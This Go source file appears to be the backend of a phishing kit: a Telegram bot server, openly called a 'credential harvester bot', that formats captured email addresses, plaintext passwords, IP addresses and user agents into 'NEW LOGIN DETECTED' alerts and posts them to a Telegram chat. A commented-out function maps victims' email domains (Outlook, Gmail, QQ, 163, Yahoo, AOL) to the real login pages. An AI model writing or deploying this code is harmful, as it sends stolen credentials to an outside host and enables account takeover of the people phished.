package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

type TelegramConfig struct {
	Token  string
	ChatID string
}

type HarvestedCredential struct {
	Email     string
	Password  string
	IP        string
	UserAgent string
	Timestamp time.Time
}

func StartTelegramServer(cfg TelegramConfig, port string) {
	r := gin.Default()

	r.POST("/webhook", func(c *gin.Context) {
		var data map[string]interface{}
		if err := c.ShouldBindJSON(&data); err != nil {
			c.JSON(400, gin.H{"error": "Invalid payload"})
			return
		}

		message, ok := data["message"].(map[string]interface{})
		if !ok {
			c.JSON(400, gin.H{"error": "No message found"})
			return
		}

		text, _ := message["text"].(string)
		from := message["from"].(map[string]interface{})
		fromName, _ := from["first_name"].(string)

		log.Printf("[Webhook] Received from %s: %s", fromName, text)

		if strings.Contains(text, "/start") {
			response := fmt.Sprintf("Hello %s! 🚀\n\nI'm your credential harvester bot.\n\nSend me an email address and I'll set up monitoring.", fromName)
			sendTelegramMessage(cfg.Token, cfg.ChatID, response)
		} else {
			response := fmt.Sprintf("Received your message: %s\n\nI'll process it shortly!", text)
			sendTelegramMessage(cfg.Token, cfg.ChatID, response)
		}

		c.JSON(200, gin.H{"status": "received"})
	})

	log.Printf("📡 Telegram webhook server starting on :%s", port)
	if err := r.Run("0.0.0.0:" + port); err != nil {
		log.Fatalf("Failed to start Telegram server: %v", err)
	}
}

func sendTelegramMessage(token, chatID, message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)

	resp, err := http.Post(url, "application/json", strings.NewReader(fmt.Sprintf(
		`{"chat_id":"%s","text":"%s"}`, chatID, message)))
	if err != nil {
		log.Printf("Failed to send Telegram message: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("Telegram API returned status: %d", resp.StatusCode)
	}
}

func SendTelegramMessage(cfg TelegramConfig, message string) {
	go func() {
		sendTelegramMessage(cfg.Token, cfg.ChatID, message)
	}()
}

func FormatLoginAlert(email, password, ip, userAgent string) string {
	timestamp := time.Now().Format("2006-01-02 15:04:05")

	alert := fmt.Sprintf(`🔐 NEW LOGIN DETECTED

📧 Email: %s
🔑 Password: %s
🌐 IP Address: %s
🖥️ User Agent: %s
⏰ Time: %s`, email, password, ip, userAgent, timestamp)

	return alert
}

// func GetTargetDomain(email string) string {
// 	emailLower := strings.ToLower(email)

// 	switch {
// 	case strings.HasSuffix(emailLower, "@hotmail.com"),
// 		strings.HasSuffix(emailLower, "@live.com"),
// 		strings.HasSuffix(emailLower, "@outlook.com"):
// 		return "https://login.microsoftonline.com"
// 	case strings.HasSuffix(emailLower, "@163.com"),
// 		strings.HasSuffix(emailLower, "@126.com"),
// 		strings.HasSuffix(emailLower, "@yeah.net"):
// 		return "https://mail.126.com"
// 	case strings.HasSuffix(emailLower, "@qq.com"),
// 		strings.HasSuffix(emailLower, "@foxmail.com"):
// 		return "https://mail.qq.com"
// 	case strings.HasSuffix(emailLower, "@gmail.com"):
// 		return "https://accounts.google.com"
// 	case strings.HasSuffix(emailLower, "@yahoo.com"):
// 		return "https://login.yahoo.com"
// 	case strings.HasSuffix(emailLower, "@aol.com"):
// 		return "https://login.aol.com"
// 	default:
// 		return "https://login.microsoftonline.com"
// 	}
// }
